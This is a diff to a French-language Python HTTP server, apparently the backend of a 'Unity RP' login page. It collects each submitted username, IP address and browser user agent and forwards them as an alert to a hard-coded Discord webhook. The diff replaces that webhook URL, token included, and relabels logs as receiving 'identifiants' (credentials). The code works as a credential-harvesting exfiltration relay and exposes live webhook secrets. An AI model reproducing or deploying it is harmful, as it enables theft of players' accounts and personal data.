@@ -4,7 +4,7 @@ import datetime
 import urllib.request
 import os
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1536029607050870957/v2lW072iaQP_hprGmBLGJ2U_FrmrVWd-4zum6_KeiL8rZ1fBquBZYQvozIlS0HA3eva0"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"
 
 class UnityRPHandler(SimpleHTTPRequestHandler):
     def end_headers(self):
@@ -31,8 +31,9 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                 ip_addr = data.get('ip', 'Non spécifiée')
                 user_agent = data.get('userAgent', 'Non spécifié')
 
-                print(f"[EXPERT] Données reçues - Utilisateur: {username} | IP: {ip_addr}")
+                print(f"[EXPERT] Réception des identifiants pour : {username}")
 
+                # Construction du message texte sécurisé pour Discord
                 msg = (
                     f"🚨 **NOUVELLE CONNEXION UNITY RP** [{now}] 🚨\n"
                     f"👤 **Utilisateur :** {username}\n"
@@ -48,26 +49,28 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                     headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                 )
 
+                # Envoi direct vers Discord
                 urllib.request.urlopen(req)
 
+                # Réponse de succès validée au navigateur
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
                 self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
 
             except Exception as e:
-                print(f"[ERREUR] Échec de transmission au Webhook : {e}")
+                print(f"[ERREUR CRITIQUE SERVEUR] : {e}")
                 self.send_response(500)
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
                 self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
         else:
-            self.send_error(404, "Endpoint non trouvé")
+            self.send_error(404, "Page non trouvée")
 
 if __name__ == '__main__':
     os.chdir(os.path.dirname(os.path.abspath(__file__)))
     port = int(os.environ.get("PORT", 10000))
     server_address = ('', port)
     httpd = HTTPServer(server_address, UnityRPHandler)
-    print(f"Serveur Unity RP opérationnel sur le port {port}")
+    print(f"Serveur expert opérationnel sur le port {port}")
     httpd.serve_forever()
